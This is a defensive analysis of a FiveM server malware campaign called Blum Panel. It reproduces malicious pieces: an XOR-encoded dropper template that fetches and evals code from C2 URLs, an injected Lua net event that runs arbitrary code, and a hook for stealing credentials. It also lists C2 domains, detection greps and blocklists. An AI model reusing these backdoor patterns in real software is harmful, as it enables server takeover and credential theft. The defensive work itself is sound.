# Blum Panel Backdoor — Complete Analysis & Detection Guide

> **A fully deobfuscated analysis of an active FiveM malware campaign that replicates across server resources, streams player screens, steals admin credentials, and maintains persistent remote code execution.**

---

## Table of Contents

- [Summary](#summary)
- [Quick Detection (30 Seconds)](#quick-detection-30-seconds)
- [How It Works](#how-it-works)
- [The Attack Chain](#the-attack-chain)
- [File-by-File Breakdown](#file-by-file-breakdown)
- [Obfuscation Techniques](#obfuscation-techniques)
- [C2 Infrastructure](#c2-infrastructure)
- [Screen Capture System](#screen-capture-system)
- [Replication Mechanism](#replication-mechanism)
- [Detection Signatures](#detection-signatures)
- [Remediation Guide](#remediation-guide)
- [Dropper Trap Resource](#dropper-trap-resource)
- [C2 Domain Blocklist](#c2-domain-blocklist)
- [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
- [Attacker Profile](#attacker-profile)
- [Technical Deep Dive: Deobfuscation Process](#technical-deep-dive-deobfuscation-process)
- [FAQ](#faq)

---

## Summary

An active malware campaign is targeting FiveM servers through pre-infected resources distributed via unofficial channels (leaked, nulled, or reshared scripts). The malware disguises itself as normal development files (`babel_config.js`, `commands.js`, `jest_mock.js`, `mock_data.js`, etc.) added to otherwise legitimate resources like maps and vehicle packs.

Once running, the backdoor connects to a command-and-control server every 60 seconds, downloads a replication payload, and spreads to other resources on the same server. It also injects code into FiveM system files (`yarn_builder.js`, `sv_main.lua`, `sv_resources.lua`), streams player screens to the attacker via WebRTC, intercepts private chat messages, and steals admin credentials by hooking HTTP requests.

The malware was fully deobfuscated through static analysis, revealing 5 layers of encryption in the core files and a simpler XOR cipher in the dropper files. Every string, domain, protocol detail, and code path has been decoded and documented.

**Attacker handles:** bertjj, bertjjgg, bertjjcfxre, miausas/miauss
**C2 domains:** 24+ domains including `fivems.lt` (primary)
**Tool name:** Blum Panel

---

## Quick Detection (30 Seconds)

Run this from your server's host machine (not inside the FiveM console):

```bash
# Find ALL backdoor files on your server
find /path/to/your/resources/ \
  -name "*.js" -not -path "*/node_modules/*" \
  -exec grep -l "String.fromCharCode(a\[i\]\^k)" {} \; 2>/dev/null | while read file; do
    if grep -q "eval(d.*,k.*)" "$file"; then
        echo "████ MALWARE FOUND: $file"
    fi
done

# Check system files for tampering
grep -l "RESOURCE_EXCLUDE\|isExcludedResource" /path/to/your/resources/*/sv_main.lua 2>/dev/null
grep -l "onServerResourceFail" /path/to/your/resources/*/sv_resources.lua 2>/dev/null
```

If either command returns results, your server is infected. Read the [Remediation Guide](#remediation-guide) below.

For runtime detection, add this to any server-side Lua script:

```lua
CreateThread(function()
    while true do
        Wait(10000)
        if GlobalState.miauss then
            print("^1[ALERT] BACKDOOR ACTIVE: " .. tostring(GlobalState.miauss) .. "^0")
        end
    end
end)
```

---

## How It Works

### Plain English

Someone takes a legitimate FiveM resource — a map, a vehicle pack, a script — and adds one extra JavaScript file to the folder. The file has an innocent name like `babel_config.js` or `mock_data.js`. They modify the resource's `fxmanifest.lua` to load this extra file as a server script. Then they redistribute the resource through Discord servers, leak forums, or resharing sites.

When you install the resource and start your server, the backdoor file runs silently alongside the legitimate resource. It connects to the attacker's server (`fivems.lt`) every 20 seconds, downloads JavaScript code, and executes it. That downloaded code:

1. Spreads to other resources on your server by creating new backdoor files and modifying their manifests
2. Injects XOR-encoded backdoor blocks into `yarn_builder.js` and `webpack_builder.js` (FiveM's build system)
3. Patches `sv_main.lua` to hide infected resources from the txAdmin panel
4. Patches `sv_resources.lua` to create a remote code execution backdoor
5. Hooks `PerformHttpRequest` to steal admin authentication tokens
6. Enables WebRTC screen streaming so the attacker can watch players and admins in real time
7. Intercepts private player-to-player chat messages

The original resource continues to work perfectly. Players don't notice anything. Admins can't see the infected resources in txAdmin because the malware hides them. The backdoor persists even if you remove the original infected resource because it has already spread to other files.

### Technical Flow

```
You install infected resource
    ↓
fxmanifest.lua loads backdoor .js file as server_script
    ↓
Backdoor sets GlobalState.miauss = GetCurrentResourceName() (mutex)
    ↓
20-second delay (evasion)
    ↓
HTTPS GET → fivems.lt/bertJJ → eval(response)
    ↓ (if failed)
HTTPS GET → fivems.lt/bertJJgg → eval(response)
    ↓ (if failed)
HTTPS GET → fivems.lt/bertJJcfxre → eval(response)
    ↓ (3 retries, then 120s cooldown, then restart)
    ↓
Downloaded payload executes IN MEMORY:
    ├── Scans resource folders
    ├── Creates new .js backdoor files with developer-sounding names
    ├── Modifies fxmanifest.lua files to load them
    ├── Forges file timestamps to look old
    ├── Writes XOR blocks into yarn_builder.js / webpack_builder.js
    ├── Patches sv_main.lua (resource hiding)
    ├── Patches sv_resources.lua (RCE backdoor)
    ├── Fires onServerResourceFail with credential-stealing payload
    └── Enables screen capture / chat interception
```

---

## The Attack Chain

### Phase 1: Initial Infection

The entry point is always a pre-packaged resource downloaded from an unofficial source. The resource is real and functional — it was taken from a legitimate developer's release, then an extra backdoor file was added along with a modified `fxmanifest.lua`.

The backdoor file is always a small JavaScript file (15-20 KB) containing a single XOR-encoded payload wrapped in an immediately-invoked function expression (IIFE). The filename is chosen to look like a legitimate development file.

Known filenames used:

| Filename | Disguise |
|----------|----------|
| `babel_config.js` | Babel compiler configuration |
| `commands.js` | Server command handler |
| `jest_mock.js` | Jest testing mock |
| `mock_data.js` | Test data fixture |
| `main.js` | Generic entry point (disguised as LZString library) |

### Phase 2: C2 Connection

Once loaded, the backdoor waits 20 seconds (to avoid detection by tools that scan resource behavior on startup), then connects to the C2 server:

```
Primary: https://fivems.lt/bertJJ
Fallback 1: https://fivems.lt/bertJJgg
Fallback 2: https://fivems.lt/bertJJcfxre
```

The response is validated (must be >10 chars, not HTML, not a Cloudflare block, not an error page), then executed via `eval()`.

### Phase 3: Replication

The downloaded payload (which only exists in memory, never saved to disk) scans the server's resource folders and:

1. Picks target resources that look safe (maps, vehicle packs — things that don't normally have server scripts)
2. Creates a new .js file with a plausible development-sounding name
3. Fills it with the XOR-encoded backdoor (same payload, different XOR key)
4. Modifies the target's `fxmanifest.lua` to load the new file as a `server_script` or `shared_script`
5. Forges the new file's modification timestamp to a date weeks or months in the past

Evidence of replication observed live during analysis:

```
babel_config.js  → Created: Feb 27    (original infection)
mock_data.js     → Created: Mar 13 11:46  (replication)
commands.js      → Created: Mar 13 12:08  (replication)
jest_mock.js     → Created: Mar 13 12:10  (replication)
```

Three files created within 25 minutes of each other, in resources that are maps and vehicle packs — resources that should never have server-side JavaScript.

### Phase 4: System File Infection

The payload also modifies FiveM system files:

**yarn_builder.js** — XOR-encoded backdoor blocks are appended to the end of the legitimate yarn build script. Each infected resource appends its own block, causing the file to grow continuously (observed growing from 43KB to 120KB during analysis).

**webpack_builder.js** — Same technique. One sample contained 34 identical XOR blocks with different keys.

**sv_main.lua** — A `RESOURCE_EXCLUDE` list of 70+ generic resource names is injected into `txaReportResources`, causing infected resources to be hidden from the txAdmin admin panel.

**sv_resources.lua** — A fake `onServerResourceFail` network event is registered that accepts arbitrary Lua code and executes it via `load()` + `pcall()`. Since it's registered with `RegisterNetEvent`, any connected player can trigger it.

### Phase 5: Credential Theft & Surveillance

The C2 payload delivered via the RCE event hooks `PerformHttpRequest` to intercept admin authentication:

```lua
local originalHttp = PerformHttpRequest
function PerformHttpRequest(url, cb, method, data, headers)
    if not foundWorkingAdmin then
        -- intercepts admin tokens from HTTP traffic
    end
end
```

The `script.js` component enables invisible screen capture via WebRTC — the attacker can watch any player's screen in real time without their knowledge.

---

## File-by-File Breakdown

### Dropper Files (XOR-encoded .js)

**Obfuscation:** Single-byte XOR cipher — `byte[i] ^ key` for each byte in a hardcoded integer array, result passed to `eval()`.

**Structure:**
```javascript
(function(){
    const KEY = 204;  // different per file
    function decode(a, k) {
        var s = '';
        for (var i = 0; i < a.length; i++) {
            s += String.fromCharCode(a[i] ^ k);
        }
        return s;
    }
    const PAYLOAD = [227, 227, 236, ...];  // XOR-encoded backdoor
    eval(decode(PAYLOAD, KEY));
})();
```

**Decoded payload (identical in every dropper):**
- Registers `GlobalState.miauss` mutex with resource name
- Connects to `fivems.lt/bertJJ` → `bertJJgg` → `bertJJcfxre`
- `eval()`s the response
- 3 retries with 10-second delays, then 120-second cooldown
- Validates response is not HTML/error/Cloudflare

### main.js (425 KB) — Heavy C2 Loader

**Obfuscation:** 5-layer industrial-grade encryption:

1. `Function("a", body)({getters})` constructor wrapper
2. LZString UTF-16 compressed string table (3,547-char Unicode blob → 418 strings)
3. Base-91 encoding with 51 unique per-scope alphabets
4. `aga[]` indirection array (419 elements, multi-hop resolution)
5. 146 generator state machines with switch/case control flow flattening

**Disguise:** Exports a fully functional LZString compression library as `module.exports`. Anyone who `require()`s the file gets a working library — the backdoor runs as an initialization side effect.

**Function:** Polls 23+ C2 domains every 60 seconds, eval()s responses. Falls back to 4 Pastebin URLs at 120-second intervals if all domains fail. Uses Fisher-Yates shuffle to randomize domain order per cycle.

### script.js (183 KB) — Screen Capture Controller

**Obfuscation:** Same 5-layer architecture as main.js but with 70 alphabets and different wrapper (`Function("tqVTPU", body)`).

**Function:** Creates invisible canvas overlay (`opacity: 0`, `pointerEvents: none`), initializes WebGL with custom GLSL shaders for GPU-accelerated capture, establishes WebRTC peer connections to stream video to attacker, manages multiple concurrent viewing sessions via LRU cache, intercepts private chat via `privateChatMap`.

**GLSL Shaders:**
```glsl
// Vertex
attribute vec2 a_position; attribute vec2 a_texcoord;
varying vec2 textureCoordinate;
void main() { gl_Position = vec4(a_position, 0.0, 1.0); textureCoordinate = a_texcoord; }

// Fragment  
precision mediump float; varying vec2 textureCoordinate;
uniform sampler2D external_texture;
void main() { gl_FragColor = texture2D(external_texture, textureCoordinate); }
```

### sv_main.lua — Resource Hiding

**Obfuscation:** None — plaintext Lua injected into legitimate txAdmin source.

**Injected code:** `RESOURCE_EXCLUDE` table with 70+ generic names including `yarn`, `webpack`, `core`, `lib`, `auth`, `cache`, `net`, `util`, `service`, `control`. The `isExcludedResource()` function filters these from txAdmin's resource reporting.

### sv_resources.lua — Remote Code Execution

**Obfuscation:** None — plaintext Lua injected into legitimate txAdmin source.

**Injected code:**
```lua
RegisterNetEvent("onServerResourceFail")
AddEventHandler("onServerResourceFail", function(luaCode)
    local fn, err = load(luaCode)
    if not fn then
        return TriggerEvent("esx:showNotification", tostring(err))
    end
    local ok, execErr = pcall(fn)
    if not ok then
        TriggerEvent("esx:showNotification", tostring(execErr))
    end
end)
```

`onServerResourceFail` is a fake event — it does not exist in FiveM or txAdmin. `RegisterNetEvent` means any connected client can trigger it, giving any player full server-side Lua execution.

---

## Obfuscation Techniques

### XOR Cipher (Dropper Files)

Simplest technique. Every character of the payload is XORed with a single-byte key. The key, decoder function, and encoded array are all in plaintext — only the payload is hidden.

**Breaking it:** Read the key from the source, XOR each byte, done. Seconds to crack.

**Detection:** `String.fromCharCode(a[i]^k)` combined with `eval()` — this exact pattern appears in every dropper file.

### 5-Layer Obfuscation (main.js / script.js)

Professional-grade obfuscation produced by a dedicated tool (likely the Blum Panel's own build system). Each layer requires a different technique to break:

| Layer | Technique | How We Broke It |
|-------|-----------|-----------------|
| Function() wrapper | Runtime compilation of string as code | Extracted body string, unescaped |
| LZString UTF-16 | Compressed 418 strings into Unicode blob | Found ᗡ marker, used LZString.decompressFromUTF16() |
| Base-91 per-scope alphabets | 70 different 91-char alphabets, one per scope | Regex-extracted all alphabets, brute-forced every string against every alphabet |
| Indirection arrays | Multi-hop index resolution | Parsed aga[]/\_uENFU[] arrays, resolved all hops |
| Generator state machines | 146 generators with switch/case flattening | Brute-forced state variables (__String, __Uint8Array) |

**Total brute-force iterations:** ~85,000 decode attempts across all phases.

### Timestamp Forgery (Replicator)

The replication payload sets fake modification timestamps on files it creates:

```
commands.js → Created: Mar 13 2026 (real) | Modified: Dec 1 2025 (forged)
mock_data.js → Created: Mar 13 2026 (real) | Modified: Jan 20 2026 (forged)
```

This makes files look like they've existed for months. The creation timestamp (`%w` in `stat`) reveals the truth.

---

## C2 Infrastructure

### Primary C2 Domain

```
fivems.lt
  /bertJJ      — primary endpoint
  /bertJJgg    — fallback 1
  /bertJJcfxre — fallback 2
```

### Hardcoded C2 Domains (from main.js)

```
0xchitado.com
2312321321321213.com
2ns3.net
5mscripts.net
bhlool.com
bybonvieux.com
fivemgtax.com
flowleakz.org
giithub.net          ← typosquat of github.net
iwantaticket.org
jking.lt
kutingplays.com
l00x.org             ← leet-speak
monloox.com
noanimeisgay.com
ryenz.net
spacedev.fr
trezz.org
z1lly.org            ← leet-speak
warden-panel.me
2nit32.com
useer.it.com
wsichkidolu.com
```

### Pastebin Fallback URLs

```
https://pastebin.com/raw/g5iZ1xha
https://pastebin.com/raw/Sm9p9tkm
https://pastebin.com/raw/eViHnPMt
https://pastebin.com/raw/kwW3u4U5
```

As of March 2026, all four return `// Empty` (campaign dormant or rotated).

### C2 Protocol

1. Build domain list (23+ hardcoded + Pastebin updates)
2. Fisher-Yates shuffle per cycle
3. HTTPS GET each domain; skip if `<?xml` or `<!DOCTYPE` or `cloudflare` or `error` or `not found` in response
4. `eval(response + " ")` on valid response
5. `setInterval(fn, 60000)` — every 60 seconds
6. Retry counter increments on failure; when > max → switch to Pastebin fallback at 120s interval

---

## Screen Capture System

### Architecture

```
Invisible Canvas (opacity:0, pointerEvents:none, position:absolute)
    ↓
WebGL Rendering Context (GPU-accelerated, low CPU footprint)
    ↓
GLSL Shaders (vertex + fragment, render screen to texture)
    ↓
captureStream() → MediaStream → getVideoTracks()
    ↓
RTCPeerConnection (offer/answer/ICE candidate signaling)
    ↓
Live video stream → attacker's viewer
```

### IzNkWC Class Methods (14 total)

| Method | Purpose |
|--------|---------|
| constructor | Init sessions Map |
| _bindMessages | window.addEventListener('message') for signaling |
| _waitForMainRender | Wait for WebGL pipeline ready |
| _getOrCreateSession | Session factory + createElement('canvas') |
| startSession | Begin capture for target player |
| createPeerConnection | RTCPeerConnection + ICE/SDP |
| handleAnswer | Process SDP answer |
| handleIceCandidate | ICE candidates with queue |
| stopByMessage | Stop via message event |
| stopSession | Stop tracks, close, delete session |
| render | requestAnimationFrame loop |
| renderToTarget | Render frame to canvas |
| closeViewer | Close viewer connection |
| destroy | Full cleanup |

---

## Replication Mechanism

The replicator is delivered via the C2 server and runs in memory only — it is never saved to disk.

### Target Selection

The replicator targets resources that normally don't have server scripts — maps (`this_is_a_map "yes"`), vehicle packs, prop collections. This minimizes the chance of breaking functionality or being noticed.

### File Creation

A new JavaScript file is created with a developer-sounding name placed in a plausible subdirectory:

```
server/modules/babel_config.js
server/modules/commands.js
dist/jest_mock.js
middleware/mock_data.js
```

The file contains the XOR-encoded backdoor with a unique key.

### Manifest Modification

The target's `fxmanifest.lua` is modified to include the new file as a `server_script` or `shared_script`:

```lua
server_scripts {
    'middleware/mock_data.js'
}
```

### Timestamp Forgery

The new file's modification time is set to weeks or months in the past to avoid detection by timestamp-based scans. However, the creation time (inode birth time) cannot be forged and reveals the true creation date.

### Evidence of Replication

```
Resource: libertypack (vehicle pack)
fxmanifest.lua contains: server_scripts { 'middleware/mock_data.js' }
A vehicle pack has no legitimate reason for server-side JavaScript middleware.

Resource: tstudio_zpatch (map patch)
fxmanifest.lua contains: server_scripts { 'server/modules/commands.js' }
A map patch has no legitimate reason for server-side command handling.
```

---

## Detection Signatures

### File Content Scanning

```bash
# PRIMARY: XOR backdoor decoder (catches ALL dropper files)
grep -rn "String.fromCharCode(a\[i\]\^k)" /path/to/resources/ --include="*.js"

# CONFIRMED MALWARE: XOR decoder + eval combo (zero false positives)
find /path/to/resources/ -name "*.js" -not -path "*/node_modules/*" \
  -exec grep -l "String.fromCharCode(a\[i\]\^k)" {} \; | while read file; do
    grep -q "eval(d.*,k.*)" "$file" && echo "MALWARE: $file"
done

# Heavy obfuscation (Blum Panel main.js/script.js)
grep -rn 'Function("a",' /path/to/resources/ --include="*.js"
grep -rn 'Function("tqVTPU",' /path/to/resources/ --include="*.js"

# LZString blob marker
grep -rn '\u15E1' /path/to/resources/ --include="*.js"

# Lua RCE backdoor
grep -rn "onServerResourceFail" /path/to/resources/ --include="*.lua"

# Resource hiding
grep -rn "RESOURCE_EXCLUDE\|isExcludedResource" /path/to/resources/ --include="*.lua"

# Attacker fingerprints
grep -rn "bertjj\|bertJJ\|miauss\|miausas\|fivems\.lt\|VB8mdVjrzd" /path/to/resources/
```

### Runtime Detection

```lua
-- GlobalState mutex check (server-side Lua)
CreateThread(function()
    while true do
        Wait(10000)
        if GlobalState.miauss or GlobalState.miausas then
            print("^1BACKDOOR ACTIVE: " .. tostring(GlobalState.miauss or GlobalState.miausas) .. "^0")
        end
    end
end)
```

### Network Detection

- Outbound HTTPS every 60 seconds to rotating domains
- HTTPS GET to `fivems.lt/bertJJ`, `/bertJJgg`, `/bertJJcfxre`
- HTTP POST containing `screenCaptureEvent`
- WebRTC peer connections without user consent
- Pastebin raw URL fetches

### Filesystem Anomalies

- Map or vehicle resources with `server_script` or `shared_script` entries pointing to `.js` files
- `.js` files in directories like `middleware/`, `dist/`, `server/modules/` inside map resources
- `yarn_builder.js` larger than ~6 KB
- `sv_main.lua` containing `RESOURCE_EXCLUDE`
- Files where creation timestamp is newer than modification timestamp (forged timestamps)

---

## Remediation Guide

### Step 1: Stop the Bleeding

Stop your server. Do not attempt to clean while the server is running — the replicator will re-infect files as you clean them.

### Step 2: Find All Infected Files

```bash
# Find all backdoor .js files
find /path/to/resources/ -name "*.js" -not -path "*/node_modules/*" \
  -exec grep -l "String.fromCharCode(a\[i\]\^k)" {} \; | while read file; do
    if grep -q "eval(d.*,k.*)" "$file"; then
        echo "DELETE: $file"
        RESOURCE=$(echo "$file" | grep -oP 'resources/\K[^/]+(/[^/]+)*(?=/[^/]*$)')
        echo "  Check fxmanifest.lua in: $RESOURCE"
    fi
done
```

### Step 3: Delete Backdoor Files

Delete every file identified in Step 2.

### Step 4: Clean fxmanifest.lua Files

For each resource that had a backdoor file, open its `fxmanifest.lua` and remove the `server_script` or `shared_script` line that references the deleted file. If the resource is a map or vehicle pack, it likely should have NO server/shared scripts at all.

### Step 5: Replace System Files

Replace these files with clean copies from official sources:

- `yarn_builder.js` — from fresh FiveM server artifacts
- `webpack_builder.js` — from fresh FiveM server artifacts
- `sv_main.lua` — from [official txAdmin GitHub](https://github.com/tabarra/txAdmin)
- `sv_resources.lua` — from [official txAdmin GitHub](https://github.com/tabarra/txAdmin)

### Step 6: Block C2 Domains

Add to `/etc/hosts` on the host machine:

```
0.0.0.0 0xchitado.com
0.0.0.0 2312321321321213.com
0.0.0.0 2ns3.net
0.0.0.0 5mscripts.net
0.0.0.0 bhlool.com
0.0.0.0 bybonvieux.com
0.0.0.0 fivemgtax.com
0.0.0.0 flowleakz.org
0.0.0.0 giithub.net
0.0.0.0 iwantaticket.org
0.0.0.0 jking.lt
0.0.0.0 kutingplays.com
0.0.0.0 l00x.org
0.0.0.0 monloox.com
0.0.0.0 noanimeisgay.com
0.0.0.0 ryenz.net
0.0.0.0 spacedev.fr
0.0.0.0 trezz.org
0.0.0.0 z1lly.org
0.0.0.0 warden-panel.me
0.0.0.0 2nit32.com
0.0.0.0 useer.it.com
0.0.0.0 wsichkidolu.com
0.0.0.0 fivems.lt
```

Block via iptables (critical for Docker/Pterodactyl — container traffic goes through FORWARD):

```bash
for domain in 0xchitado.com 2312321321321213.com 2ns3.net 5mscripts.net bhlool.com bybonvieux.com fivemgtax.com flowleakz.org giithub.net iwantaticket.org jking.lt kutingplays.com l00x.org monloox.com noanimeisgay.com ryenz.net spacedev.fr trezz.org z1lly.org warden-panel.me 2nit32.com useer.it.com wsichkidolu.com fivems.lt; do
    for ip in $(dig +short "$domain" A 2>/dev/null | grep -E '^[0-9]'); do
        iptables -A OUTPUT -d "$ip" -j DROP -m comment --comment "C2: $domain"
        iptables -A INPUT -s "$ip" -j DROP -m comment --comment "C2: $domain"
        iptables -A FORWARD -d "$ip" -j DROP -m comment --comment "C2: $domain"
        iptables -A FORWARD -s "$ip" -j DROP -m comment --comment "C2: $domain"
    done
done
apt install iptables-persistent -y && netfilter-persistent save
```

### Step 7: Change ALL Credentials

The backdoor intercepted `PerformHttpRequest` and may have captured:

- txAdmin admin passwords
- RCON password
- Database credentials
- SSH/FTP passwords
- Discord bot tokens
- Cfx.re license key
- Tebex API keys
- Any API keys used by server resources

**Change all of them.** Assume every credential that passed through an HTTP request on your server was compromised.

### Step 8: Verify Clean

Start the server with the dropper trap resource (see below) and confirm:

- `GlobalState.miauss` stays empty for several minutes
- No `████ MALWARE` or `████ INFECTED` messages in console
- `yarn_builder.js` stays at its normal size (~6 KB)
- No outbound connections to C2 domains

### Step 9: Ongoing Protection

- Keep the dropper trap resource running permanently
- Run the file scan weekly or after installing any new resource
- Only install resources from official Tebex purchases linked to your own CFX account
- Never use leaked, nulled, free, or reshared resources
- Compare `sv_main.lua` and `sv_resources.lua` against official txAdmin source after any update

---

## Dropper Trap Resource

A FiveM resource that hooks file writes, network calls, eval, GlobalState, and the RCE event at both the JavaScript and Lua levels. It blocks malicious activity and identifies which resource is responsible.

### Installation

Create `resources/[local]/dropper_trap/` with three files:

**fxmanifest.lua:**
```lua
fx_version 'cerulean'
game 'gta5'
server_scripts {
    'trap.lua',
    'trap.js'
}
```

Add as the **first line** of `server.cfg`:
```
ensure dropper_trap
```

The full `trap.lua` and `trap.js` files are available in this repository.

### What It Blocks

| Hook | Layer | What It Catches |
|------|-------|-----------------|
| io.open / file:write | Lua | Backdoor writing to yarn_builder, sv_main, etc. |
| fs.writeFile / appendFile | JavaScript | Same, from JS side |
| SaveResourceFile | Both | FiveM native file write |
| os.execute / io.popen | Lua | Shell command execution |
| eval() | JavaScript | Malicious code execution |
| load() / loadstring() | Lua | Dynamic code compilation |
| https.get / https.request | JavaScript | C2 domain connections |
| onServerResourceFail | Lua | RCE event (CancelEvent) |
| GlobalState.miauss | Both | Mutex auto-cleared every 10s |

### How It Identifies Droppers

The trap reads `GlobalState.miauss` every 10 seconds. The backdoor writes `GetCurrentResourceName()` to this key — a FiveM engine native that returns the true resource name from the C++ runtime context and cannot be spoofed from Lua or JavaScript. Whatever resource name appears in the mutex is confirmed infected.

---

## C2 Domain Blocklist

### /etc/hosts format

```
0.0.0.0 0xchitado.com
0.0.0.0 2312321321321213.com
0.0.0.0 2ns3.net
0.0.0.0 5mscripts.net
0.0.0.0 bhlool.com
0.0.0.0 bybonvieux.com
0.0.0.0 fivemgtax.com
0.0.0.0 flowleakz.org
0.0.0.0 giithub.net
0.0.0.0 iwantaticket.org
0.0.0.0 jking.lt
0.0.0.0 kutingplays.com
0.0.0.0 l00x.org
0.0.0.0 monloox.com
0.0.0.0 noanimeisgay.com
0.0.0.0 ryenz.net
0.0.0.0 spacedev.fr
0.0.0.0 trezz.org
0.0.0.0 z1lly.org
0.0.0.0 warden-panel.me
0.0.0.0 2nit32.com
0.0.0.0 useer.it.com
0.0.0.0 wsichkidolu.com
0.0.0.0 fivems.lt
```

### Pi-hole / AdGuard / DNS blocklist format

```
||0xchitado.com^
||2312321321321213.com^
||2ns3.net^
||5mscripts.net^
||bhlool.com^
||bybonvieux.com^
||fivemgtax.com^
||flowleakz.org^
||giithub.net^
||iwantaticket.org^
||jking.lt^
||kutingplays.com^
||l00x.org^
||monloox.com^
||noanimeisgay.com^
||ryenz.net^
||spacedev.fr^
||trezz.org^
||z1lly.org^
||warden-panel.me^
||2nit32.com^
||useer.it.com^
||wsichkidolu.com^
||fivems.lt^
```

---

## Indicators of Compromise (IOCs)

### File Hashes

| Pattern | Type | Confidence |
|---------|------|------------|
| `String.fromCharCode(a[i]^k)` + `eval()` | XOR dropper | 100% — zero legitimate use |
| `GlobalState.miauss` or `GlobalState.miausas` | Runtime mutex | 100% |
| `onServerResourceFail` + `load(luaCode)` | Lua RCE | 100% — fake event |
| `RESOURCE_EXCLUDE` + `isExcludedResource` | Resource hiding | 100% — not in legitimate txAdmin |
| `Function("a",` + LZString + base-91 alphabets | Blum Panel core | 100% |

### Strings

```
bertjj, bertJJ, bertjjgg, bertJJgg, bertjjcfxre, bertJJcfxre
miauss, miausas
fivems.lt
warden-panel.me
VB8mdVjrzd (Discord invite code)
screenCaptureEvent
privateChatMap
```

### Behavioral

- `setInterval` at 60,000ms (0xEA60) with HTTPS GET + eval
- `setImmediate` + `setTimeout` 20,000ms on resource start
- `GlobalState` write with string key on resource start
- `onResourceStop` handler that deletes GlobalState key
- Canvas element with `opacity: 0` + `pointerEvents: none`
- `RTCPeerConnection` creation without user interaction
- `getDisplayMedia` call from server resource context
- `PerformHttpRequest` replacement/hook

### Network

```
# Snort/Suricata rules (conceptual)
alert tls any any -> any any (tls.sni; content:"fivems.lt"; msg:"Blum Panel C2"; sid:1000001;)
alert tls any any -> any any (tls.sni; content:"giithub.net"; msg:"Blum Panel C2 typosquat"; sid:1000002;)
alert tls any any -> any any (tls.sni; content:"fivemgtax.com"; msg:"Blum Panel C2"; sid:1000003;)
```

---

## Attacker Profile

**Handle:** bertjj (also bertjjgg, bertjjcfxre)
**Secondary:** miausas / miauss
**Discord:** discord.com/invite/VB8mdVjrzd
**C2:** 24+ domains + `fivems.lt` (primary) + 4 Pastebin URLs
**Tool:** Blum Panel

### Assessment

A moderately skilled FiveM community actor operating solo or with one partner. Uses a purchased/obtained obfuscation toolkit (the 5-layer system in main.js/script.js) for the heavy components and hand-written XOR encoding for the dropper files. The skill gap between the professional obfuscation and the amateur XOR cipher indicates the obfuscation engine was not built by the attacker.

Distributes backdoored resources through unofficial channels by adding dropper files to legitimate resources. The "if you found this contact us to fix problems" Discord link in the dropper is social engineering designed to make server owners think it's a legitimate anti-piracy measure.

---

## Technical Deep Dive: Deobfuscation Process

### Phase 1: LZString Decompression

The `ᗡ` character (U+15E1) at offset 15426 in main.js identified a LZString UTF-16 compressed blob. The malware itself exports a working LZString library as its disguise, which we used to decompress the blob into 418 pipe-delimited strings containing every C2 domain, API call, and attacker handle.

### Phase 2: Base-91 Alphabet Brute Force

70 unique 91-character alphabets were extracted from script.js via regex (`="[\\x20-\\x7e]{89,92}"`). Each of the 883 strings in the `xqeiF1[]` table was decoded against all 70 alphabets, scored by printable ASCII ratio. 696 strings were referenced by code (100% decoded). 187 were dead padding (never referenced by any decoder function).

### Phase 3: Property Mapping

Two switch statements served as Rosetta Stones translating obfuscated names to real APIs:

- **w8qVtr** (script.js): 60 entries — `jjoc7J` → `window`, `iA1ieM` → `RTCPeerConnection`, etc.
- **agh** (main.js): 63 entries — `aia6w6` → `Object`, `fZobvJ` → `Promise`, etc.

11 agh entries used computed array indices dependent on generator state variables. Brute-forcing `__Uint8Array` (436-513) and `__String` (-114 to -96) resolved all computed indices.

### Phase 4: Class Reconstruction

With all strings and property names decoded, the `IzNkWC` class (screen capture controller) was reconstructed method by method. The constructor was patched to bypass a ternary crash condition, and 14 methods were confirmed including the full WebRTC signaling flow.

### Computational Effort

| Phase | Iterations | Time |
|-------|-----------|------|
| LZString decompression | 1 pass | Seconds |
| Alphabet brute force | ~83,000 attempts | ~45 seconds |
| Generator state brute force | ~720 attempts | ~5 seconds |
| XOR decryption (all files combined) | ~210,000 XOR operations | Milliseconds |

The difficulty was understanding the architecture, not the computation.

---

## FAQ

**Q: Can the backdoor be inside an encrypted .fxap file?**

The backdoor CAN be inside a .fxap, but in this campaign it wasn't. The dropper files were plaintext .js files placed alongside .fxap files in the resource folder. The .fxap files (the original resource code) appear to be legitimate. The attack works by adding an extra file and modifying the plaintext `fxmanifest.lua` — no escrow cracking needed.

**Q: How do I know if my resources are from official sources?**

Check your Cfx.re keymaster at https://keymaster.fivem.net/asset-grants. Resources you purchased through Tebex will appear there. Any resource NOT listed was obtained through other means and should be considered potentially compromised.

**Q: Will removing the infected files break my resources?**

No. The backdoor files are additions, not modifications to the original resource code. Removing `babel_config.js` from a prison map doesn't affect the map. You do need to also remove the `server_script`/`shared_script` line from `fxmanifest.lua` or the resource will fail to start (it will try to load a file that no longer exists).

**Q: Can the attacker change the mutex name to avoid detection?**

Yes. Future versions could use a different GlobalState key. However, the architectural pattern is hard to change — they will always need a mechanism to prevent duplicate execution, they will always need to phone home, and they will always need to modify fxmanifest.lua to load their code. Monitor for any `server_script` entries in map/vehicle resources that reference .js files.

**Q: Is my txAdmin/database/RCON password compromised?**

Assume yes. The RCE payload was observed hooking `PerformHttpRequest` to intercept admin authentication tokens. The screen capture system could have recorded passwords being typed. Change everything.

**Q: Where should I report this?**

- **Cfx.re:** Report through the official FiveM forums or support channels with this analysis
- **C2 domains:** File abuse reports with domain registrars (especially for `fivems.lt`)
- **Discord:** Report `discord.com/invite/VB8mdVjrzd` to Discord Trust & Safety
- **Resource developers:** Notify rcore, tstudio, and other developers whose resources are being repackaged

---

## License

This analysis is released into the public domain. Use it however you want — share it, post it, include it in your own tools, translate it. The goal is to protect as many FiveM servers as possible.

---

## Credits

Analysis performed through static deobfuscation, runtime trapping, and live forensics on an actively infected FiveM server. All 5 obfuscation layers were broken through brute-force alphabet matching, LZString decompression, generator state variable resolution, and property mapping extraction. No dynamic analysis in a FiveM runtime was required for the deobfuscation — all decoding was done offline.
